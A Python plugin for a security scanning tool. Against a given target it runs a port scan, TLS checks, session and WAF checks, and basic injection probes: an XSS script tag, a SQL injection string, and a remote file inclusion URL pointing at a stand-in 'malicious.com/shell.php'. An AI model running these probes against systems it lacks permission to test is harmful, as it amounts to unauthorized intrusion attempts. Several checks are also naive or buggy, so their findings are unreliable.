# plugins/security_analysis.py
from plugins.base_plugin import BasePlugin
import socket
import ssl
import requests
from bs4 import BeautifulSoup
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

class SecurityAnalysisPlugin(BasePlugin):
    @property
    def name(self) -> str:
        return "Security Analysis"

    @property
    def description(self) -> str:
        return (
            "Conduct open ports scanning, vulnerability assessment, SSL/TLS configuration checks, "
            "subdomain enumeration, test for vulnerabilities (XSS, CSRF, SSRF, SQL injection, remote file inclusion), "
            "analyze session management, error handling mechanisms, password policies, security headers, and WAF detection."
        )

    @property
    def required_api_keys(self) -> list:
        return []  # No API keys required

    def run(self, target: str) -> dict:
        results = {}
        try:
            # Extract hostname from target
            if not target.startswith(("http://", "https://")):
                target = "http://" + target  # Default to HTTP if scheme not provided
            parsed_url = requests.utils.urlparse(target)
            hostname = parsed_url.hostname

            # 1. Open Ports Scanning
            open_ports = self.scan_open_ports(hostname)
            results["Open Ports"] = open_ports

            # 2. SSL/TLS Configuration Checks
            ssl_info = self.check_ssl_configuration(target)
            results["SSL/TLS Configuration"] = ssl_info

            # 3. Vulnerability Assessment
            vulnerabilities = self.assess_vulnerabilities(target)
            results["Vulnerabilities"] = vulnerabilities

            # 4. Session Management Analysis
            session_info = self.analyze_session_management(target)
            results["Session Management"] = session_info

            # 5. Error Handling Mechanisms
            error_handling = self.analyze_error_handling(target)
            results["Error Handling"] = error_handling

            # 6. Password Policies
            password_policies = self.analyze_password_policies(target)
            results["Password Policies"] = password_policies

            # 7. WAF Detection
            waf_detection = self.detect_waf(target)
            results["WAF Detection"] = waf_detection

        except Exception as e:
            results["Error"] = str(e)

        return results

    def scan_open_ports(self, hostname, port_range=(20, 1024), max_workers=100):
        open_ports = []
        try:
            ports = range(port_range[0], port_range[1] + 1)
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                future_to_port = {executor.submit(self.check_port, hostname, port): port for port in ports}
                for future in as_completed(future_to_port):
                    port = future_to_port[future]
                    try:
                        if future.result():
                            open_ports.append(port)
                    except Exception as e:
                        # Log or handle individual port scan errors if necessary
                        pass
        except Exception as e:
            open_ports.append(f"Error scanning ports: {str(e)}")
        return open_ports

    def check_port(self, hostname, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.3)  # Reduced timeout for faster scanning
                result = sock.connect_ex((hostname, port))
                return result == 0
        except:
            return False

    def check_ssl_configuration(self, url):
        ssl_info = {}
        try:
            context = ssl.create_default_context()
            with socket.create_connection((url, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=url) as ssock:
                    cert = ssock.getpeercert()
                    ssl_info["SSL Version"] = ssock.version()
                    ssl_info["Cipher"] = ssock.cipher()
                    ssl_info["Certificate Subject"] = dict(x[0] for x in cert['subject'])
                    ssl_info["Certificate Issuer"] = dict(x[0] for x in cert['issuer'])
                    # Convert datetime strings to ISO format
                    ssl_info["Valid From"] = self.convert_to_datetime(cert.get('notBefore'))
                    ssl_info["Valid To"] = self.convert_to_datetime(cert.get('notAfter'))
        except Exception as e:
            ssl_info["Error"] = str(e)
        return ssl_info

    def convert_to_datetime(self, date_str):
        """Convert certificate date string to ISO format."""
        try:
            return datetime.strptime(date_str, '%b %d %H:%M:%S %Y %Z').isoformat()
        except Exception:
            return date_str  # Return original string if parsing fails

    def assess_vulnerabilities(self, url):
        vulnerabilities = {}
        try:
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Check for XSS vulnerability (basic check)
            if "<script>alert('XSS')</script>" in response.text:
                vulnerabilities["XSS"] = "Possible XSS vulnerability detected."
            else:
                vulnerabilities["XSS"] = "No immediate XSS vulnerabilities detected."

            # Check for CSRF tokens
            forms = soup.find_all('form')
            csrf_found = False
            for form in forms:
                if form.find('input', {'name': re.compile('csrf', re.I)}):
                    csrf_found = True
                    break
            vulnerabilities["CSRF"] = "CSRF tokens present." if csrf_found else "CSRF tokens missing."

            # SQL Injection (basic check)
            test_payload = "' OR '1'='1"
            injection_url = f"{url}?test={test_payload}"
            try:
                injection_response = requests.get(injection_url, timeout=10)
                if "error" in injection_response.text.lower():
                    vulnerabilities["SQL Injection"] = "Possible SQL Injection vulnerability detected."
                else:
                    vulnerabilities["SQL Injection"] = "No immediate SQL Injection vulnerabilities detected."
            except:
                vulnerabilities["SQL Injection"] = "Error testing SQL Injection."

            # Remote File Inclusion (RFI) (basic check)
            rfi_payload = "http://malicious.com/shell.php"
            rfi_url = f"{url}/?page={rfi_payload}"
            try:
                rfi_response = requests.get(rfi_url, timeout=10)
                if "error" in rfi_response.text.lower():
                    vulnerabilities["RFI"] = "Possible Remote File Inclusion vulnerability detected."
                else:
                    vulnerabilities["RFI"] = "No immediate Remote File Inclusion vulnerabilities detected."
            except:
                vulnerabilities["RFI"] = "Error testing Remote File Inclusion."

            # XSS in input fields (basic scan)
            inputs = soup.find_all('input')
            xss_found = False
            for input_field in inputs:
                name = input_field.get('name', '')
                if not name:
                    continue
                test_input = "<script>alert('XSS')</script>"
                data = {name: test_input}
                try:
                    xss_test_response = requests.post(url, data=data, timeout=10)
                    if test_input in xss_test_response.text:
                        xss_found = True
                        break
                except:
                    continue
            vulnerabilities["XSS Input"] = "Possible XSS vulnerability via input fields." if xss_found else "No immediate XSS vulnerabilities via input fields."

        except Exception as e:
            vulnerabilities["Error"] = str(e)
        return vulnerabilities

    def analyze_session_management(self, url):
        session_info = {}
        try:
            response = requests.get(url, timeout=10)
            cookies = response.cookies
            if not cookies:
                session_info["Session Management"] = "No session cookies detected."
            else:
                secure_cookies = [cookie for cookie in cookies if cookie.secure]
                http_only_cookies = [cookie for cookie in cookies if 'HttpOnly' in cookie._rest.keys()]
                session_info["Total Cookies"] = len(cookies)
                session_info["Secure Cookies"] = len(secure_cookies)
                session_info["HttpOnly Cookies"] = len(http_only_cookies)
        except Exception as e:
            session_info["Error"] = str(e)
        return session_info

    def analyze_error_handling(self, url):
        error_handling = {}
        try:
            # Induce a 404 error
            error_url = f"{url}/nonexistentpage12345"
            response = requests.get(error_url, timeout=10)
            if response.status_code == 404:
                error_handling["Error Handling"] = "Proper 404 error handling detected."
            else:
                error_handling["Error Handling"] = f"Unexpected status code for nonexistent page: {response.status_code}"
        except Exception as e:
            error_handling["Error"] = str(e)
        return error_handling

    def analyze_password_policies(self, url):
        password_policies = {}
        try:
            # Attempt to find password policy page
            policy_urls = [
                f"{url}/password-policy",
                f"{url}/account/security",
                f"{url}/account/password",
                f"{url}/security/policies"
            ]
            for policy_url in policy_urls:
                try:
                    response = requests.get(policy_url, timeout=10)
                    if response.status_code == 200:
                        password_policies["Password Policy URL"] = policy_url
                        # Extract first 200 characters as a snippet
                        snippet = response.text[:200].replace('\n', ' ').replace('\r', '')
                        password_policies["Content Snippet"] = snippet
                        break
                except:
                    continue
            else:
                password_policies["Password Policy"] = "Password policy page not found."
        except Exception as e:
            password_policies["Error"] = str(e)
        return password_policies

    def detect_waf(self, url):
        waf_detection = {}
        try:
            response = requests.get(url, timeout=10)
            headers = response.headers
            server = headers.get('Server', '').lower()
            x_powered_by = headers.get('X-Powered-By', '').lower()

            # Common WAF indicators
            waf_signatures = {
                "Cloudflare": "cloudflare",
                "Mod_Security": "mod_security",
                "Incapsula": "incapsula",
                "Akamai": "akamai",
                "Sucuri": "sucuri",
                "Imperva": "imperva",
                "F5": "f5",
            }

            detected_waf = []
            for waf, signature in waf_signatures.items():
                if signature in server or signature in x_powered_by:
                    detected_waf.append(waf)

            if detected_waf:
                waf_detection["WAF"] = f"Detected WAF: {', '.join(detected_waf)}"
            else:
                waf_detection["WAF"] = "No WAF detected."

        except Exception as e:
            waf_detection["Error"] = str(e)
        return waf_detection
